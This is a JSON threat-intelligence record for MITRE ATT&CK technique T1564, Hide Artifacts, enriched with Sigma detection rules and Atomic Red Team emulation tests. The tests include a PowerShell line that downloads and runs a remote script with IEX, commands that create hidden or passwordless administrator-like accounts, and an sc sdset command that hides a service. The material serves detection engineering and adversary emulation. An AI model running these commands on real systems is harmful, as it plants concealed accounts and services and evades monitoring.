{
    "id": "T1564",
    "name": "Hide Artifacts",
    "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",
    "platforms": "Linux, macOS, Windows, Office 365",
    "kill_chain_phases": "Defense Evasion",
    "data_sources": "Process: Process Creation, File: File Creation, Application Log: Application Log Content, Command: Command Execution, File: File Metadata, User Account: User Account Creation, User Account: User Account Metadata, File: File Modification, Script: Script Execution, Process: OS API Execution, Windows Registry: Windows Registry Key Modification, Firmware: Firmware Modification, Service: Service Creation",
    "detection": "Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.",
    "url": "https://attack.mitre.org/techniques/T1564",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                    "815cd91b-7dbc-4247-841a-d7dd1392b0a8",
                    "74babdd6-a758-4549-9632-26535279e654",
                    "e15b518d-b4ce-4410-a9cd-501f23ce4a18",
                    "bab049ca-7471-4828-9024-38279a4c04da",
                    "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                    "22905430-4901-4c2a-84f6-98243cb173f8",
                    "ec52985a-d024-41e3-8ff6-14169039a0b3",
                    "1f2b5353-573f-4880-8e33-7d04dcf97744",
                    "2ff692c2-4594-41ec-8fcb-46587de769e0"
                ],
                "lookup_results": [
                    {
                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                        "lookup_data": {
                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1663580963",
                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "815cd91b-7dbc-4247-841a-d7dd1392b0a8",
                        "lookup_data": {
                            "description": "Detects when an adversary is trying to hide it's action from Sysmon logging based on error messages",
                            "raw": "author: frack113\ndate: 2021/06/04\ndescription: Detects when an adversary is trying to hide it's action from Sysmon logging\n  based on error messages\ndetection:\n  condition: selection_error and not 1 of filter*\n  filter_by_errorcode:\n    Description|contains:\n    - Failed to open service configuration with error 19\n    - Failed to open service configuration with error 93\n  filter_generic_english:\n    Description|contains|all:\n    - Failed to open service configuration with error\n    - 'Last error: The media is write protected.'\n  selection_error:\n    Description|contains:\n    - Failed to open service configuration with error\n    - Failed to connect to the driver to update configuration\nfalsepositives:\n- Legitimate administrative action\nid: 815cd91b-7dbc-4247-841a-d7dd1392b0a8\nlevel: high\nlogsource:\n  category: sysmon_error\n  product: windows\nmodified: 2022/07/07\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n- https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1564\ntitle: Sysmon Configuration Error\n",
                            "sigma:id": "815cd91b-7dbc-4247-841a-d7dd1392b0a8",
                            "title": "Sysmon Configuration Error",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "74babdd6-a758-4549-9632-26535279e654",
                        "lookup_data": {
                            "description": "Detect creation of suspicious executable file name. Some strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths.",
                            "raw": "author: frack113\ndate: 2022/09/05\ndescription: Detect creation of suspicious executable file name. Some strings look\n  for suspicious file extensions, others look for filenames that exploit unquoted\n  service paths.\ndetection:\n  condition: 1 of selection_*\n  selection_double:\n    TargetFilename|endswith:\n    - .bat.exe\n    - .sys.exe\n  selection_folder:\n    TargetFilename:\n    - C:\\$Recycle.Bin.exe\n    - C:\\Documents and Settings.exe\n    - C:\\MSOCache.exe\n    - C:\\Recovery.exe\n    - C:\\PerfLogs.exe\nfalsepositives:\n- Unknown\nid: 74babdd6-a758-4549-9632-26535279e654\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae\n- https://app.any.run/tasks/76c69e2d-01e8-49d9-9aea-fb7cc0c4d3ad/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1564\ntitle: Suspicious Executable File Creation\n",
                            "sigma:id": "74babdd6-a758-4549-9632-26535279e654",
                            "title": "Suspicious Executable File Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e15b518d-b4ce-4410-a9cd-501f23ce4a18",
                        "lookup_data": {
                            "description": "Once executed, colorcpl.exe will copy the arbitrary file to c:\\windows\\system32\\spool\\drivers\\color\\",
                            "raw": "author: frack113\ndate: 2022/01/21\ndescription: Once executed, colorcpl.exe will copy the arbitrary file to c:\\windows\\system32\\spool\\drivers\\color\\\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_ext:\n    TargetFilename|endswith:\n    - .icm\n    - .gmmp\n    - .cdmp\n    - .camp\n  selection:\n    Image|endswith: \\colorcpl.exe\nfalsepositives:\n- Unknown\nid: e15b518d-b4ce-4410-a9cd-501f23ce4a18\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://twitter.com/eral4m/status/1480468728324231172?s=20\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1564\ntitle: Suspicious Creation with Colorcpl\n",
                            "sigma:id": "e15b518d-b4ce-4410-a9cd-501f23ce4a18",
                            "title": "Suspicious Creation with Colorcpl",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bab049ca-7471-4828-9024-38279a4c04da",
                        "lookup_data": {
                            "description": "Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.",
                            "raw": "author: Janantha Marasinghe\ndate: 2020/09/26\ndescription: Adversaries can carry out malicious operations using a virtual instance\n  to avoid detection. This rule is built to detect the registration of the Virtualbox\n  driver or start of a Virtualbox VM.\ndetection:\n  condition: 1 of selection_*\n  selection_1:\n    CommandLine|contains:\n    - VBoxRT.dll,RTR3Init\n    - VBoxC.dll\n    - VBoxDrv.sys\n  selection_2:\n    CommandLine|contains:\n    - startvm\n    - controlvm\nfalsepositives:\n- This may have false positives on hosts where Virtualbox is legitimately being used\n  for operations\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: bab049ca-7471-4828-9024-38279a4c04da\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\n- https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1564.006\n- attack.t1564\ntitle: Detect Virtualbox Driver Installation OR Starting Of VMs\n",
                            "sigma:id": "bab049ca-7471-4828-9024-38279a4c04da",
                            "title": "Detect Virtualbox Driver Installation OR Starting Of VMs",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                        "lookup_data": {
                            "description": "FontOnLake: Previously unknown malware family targeting Linux",
                            "link": "http://www.botvrij.eu/data/feed-osint/5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1633682506",
                            "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "22905430-4901-4c2a-84f6-98243cb173f8",
                        "lookup_data": {
                            "mitre-attack-id": "T1564",
                            "mitre-cti:description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",
                            "mitre-cti:name": "Hide Artifacts",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows', 'Office 365'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8', 'type': 'attack-pattern', 'created': '2020-02-26T17:41:25.933Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1564', 'url': 'https://attack.mitre.org/techniques/T1564'}, {'url': 'https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/', 'description': \"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.\", 'source_name': 'Sofacy Komplex Trojan'}, {'url': 'https://cdn2.hubspot.net/hubfs/3354902/Content%20PDFs/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf', 'description': 'Amit Serper. (2016). Cybereason Lab Analysis OSX.Pirrit. Retrieved December 10, 2021.', 'source_name': 'Cybereason OSX Pirrit'}, {'url': 'https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/', 'description': 'Arntz, P. (2015, July 22). Introduction to Alternate Data Streams. Retrieved March 21, 2018.', 'source_name': 'MalwareBytes ADS July 2015'}, {'source_name': 'Sophos Ragnar May 2020', 'url': 'https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/', 'description': 'SophosLabs. (2020, May 21). Ragnar Locker ransomware deploys virtual machine to dodge security. Retrieved June 29, 2020.'}], 'modified': '2022-03-25T15:59:09.632Z', 'name': 'Hide Artifacts', 'description': 'Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\\n\\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_detection': 'Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.', 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['File: File Creation', 'File: File Metadata', 'Command: Command Execution', 'Process: Process Creation', 'Application Log: Application Log Content', 'Script: Script Execution', 'Windows Registry: Windows Registry Key Modification', 'Firmware: Firmware Modification', 'Process: OS API Execution', 'User Account: User Account Creation', 'User Account: User Account Metadata', 'File: File Modification', 'Service: Service Creation'], 'x_mitre_is_subtechnique': False}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ec52985a-d024-41e3-8ff6-14169039a0b3",
                        "lookup_data": {
                            "description": "Detects execution of the \"mount\" command with \"hidepid\" parameter to make invisible processes to other users from the system",
                            "raw": "author: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/01/12\ndescription: Detects execution of the \"mount\" command with \"hidepid\" parameter to\n  make invisible processes to other users from the system\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - hidepid=2\n    - ' -o '\n    Image|endswith: /mount\nfalsepositives:\n- Unknown\nid: ec52985a-d024-41e3-8ff6-14169039a0b3\nlevel: medium\nlogsource:\n  category: process_creation\n  product: linux\nreferences:\n- https://blogs.blackberry.com/\n- https://www.cyberciti.biz/faq/linux-hide-processes-from-other-users/\n- https://twitter.com/Joseliyo_Jstnk/status/1620131033474822144\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1564\ntitle: Mount Execution With Hidepid Parameter\n",
                            "sigma:id": "ec52985a-d024-41e3-8ff6-14169039a0b3",
                            "title": "Mount Execution With Hidepid Parameter",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1f2b5353-573f-4880-8e33-7d04dcf97744",
                        "lookup_data": {
                            "description": "Detects when an attacker tries to hide from Sysmon by disabling or stopping it",
                            "raw": "author: frack113\ndate: 2021/06/04\ndescription: Detects when an attacker tries to hide from Sysmon by disabling or stopping\n  it\ndetection:\n  condition: 1 of selection_* and not filter\n  filter:\n    State: Started\n  selection_conf:\n  - Sysmon config state changed\n  selection_stop:\n    State: Stopped\nfalsepositives:\n- Legitimate administrative action\nid: 1f2b5353-573f-4880-8e33-7d04dcf97744\nlevel: high\nlogsource:\n  category: sysmon_status\n  product: windows\nmodified: 2022/08/02\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n- https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1564\ntitle: Sysmon Configuration Modification\n",
                            "sigma:id": "1f2b5353-573f-4880-8e33-7d04dcf97744",
                            "title": "Sysmon Configuration Modification",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2ff692c2-4594-41ec-8fcb-46587de769e0",
                        "lookup_data": {
                            "description": "Detects disabling the CrashDump per registry (as used by HermeticWiper)",
                            "raw": "author: Tobias Michalski (Nextron Systems)\ndate: 2022/02/24\ndescription: Detects disabling the CrashDump per registry (as used by HermeticWiper)\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|contains: SYSTEM\\CurrentControlSet\\Control\\CrashControl\nfalsepositives:\n- Legitimate disabling of crashdumps\nid: 2ff692c2-4594-41ec-8fcb-46587de769e0\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/08/23\nreferences:\n- https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/\nstatus: experimental\ntags:\n- attack.t1564\n- attack.t1112\ntitle: CrashControl CrashDump Disabled\n",
                            "sigma:id": "2ff692c2-4594-41ec-8fcb-46587de769e0",
                            "title": "CrashControl CrashDump Disabled",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1564",
                "display_name": "Hide Artifacts",
                "atomic_tests": [
                    {
                        "name": "Extract binary files via VBA",
                        "auto_generated_guid": "6afe288a-8a8b-4d33-a629-8d03ba9dad3a",
                        "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Microsoft Word must be installed\n",
                                "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n",
                            "cleanup_command": "Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Create a Hidden User Called \"$\"",
                        "auto_generated_guid": "2ec63cc2-4975-41a6-bf09-dffdfb610778",
                        "description": "Creating a user with a username containing \"$\"",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "name": "command_prompt",
                            "elevation_required": true,
                            "command": "net user $ ATOMIC123! /add /active:yes",
                            "cleanup_command": "net user $ /DELETE 2>&1"
                        }
                    },
                    {
                        "name": "Create an \"Administrator \" user (with a space on the end)",
                        "auto_generated_guid": "5bb20389-39a5-4e99-9264-aeb92a55a85c",
                        "description": "Creating a user with a username containing with a space on the end",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": true,
                            "command": "New-LocalUser -Name \"Administrator \" -NoPassword",
                            "cleanup_command": "Remove-LocalUser -Name \"Administrator \" 2>&1 | out-null"
                        }
                    },
                    {
                        "name": "Create and Hide a Service with sc.exe",
                        "auto_generated_guid": "333c7de0-6fbe-42aa-ac2b-c7e40b18246a",
                        "description": "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "service_name": {
                                "description": "Name of service to create",
                                "type": "string",
                                "default": "AtomicService"
                            },
                            "executable_command": {
                                "description": "Command to execute as a service",
                                "type": "string",
                                "default": "C:\\Windows\\System32\\calc.exe"
                            }
                        },
                        "executor": {
                            "command": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc sdset #{service_name} \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n",
                            "cleanup_command": "sc sdset #{service_name} \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\nsc.exe delete #{service_name}\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Command Execution with NirCmd",
                        "auto_generated_guid": "2748ab4a-1e0b-4cf2-a2b0-8ef765bec7be",
                        "description": "NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account\nSee https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "nircmd_location": {
                                "description": "Location of nircmd executable",
                                "type": "Path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.exe"
                            },
                            "command_to_execute": {
                                "description": "Command for nircmd to execute",
                                "type": "Path",
                                "default": "win child class \"Shell_TrayWnd\" hide class \"TrayClockWClass\""
                            },
                            "cleanup_command_to_execute": {
                                "description": "Cleanup command to undo the arbitrary command ran by nircmd",
                                "type": "Path",
                                "default": "win child class \"Shell_TrayWnd\" show class \"TrayClockWClass\""
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "The Nircmd executable must exist at (#{nircmd_location})\n",
                                "prereq_command": "if (Test-Path \"#{nircmd_location}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://www.nirsoft.net/utils/nircmd-x64.zip\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.zip\" \nexpand-archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"\n"
                            }
                        ],
                        "executor": {
                            "command": "cmd /c \"#{nircmd_location}\" #{command_to_execute}\n",
                            "cleanup_command": "cmd /c \"#{nircmd_location}\" #{cleanup_command_to_execute} -erroraction silentlycontinue | out-null\n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 16:51:50"
}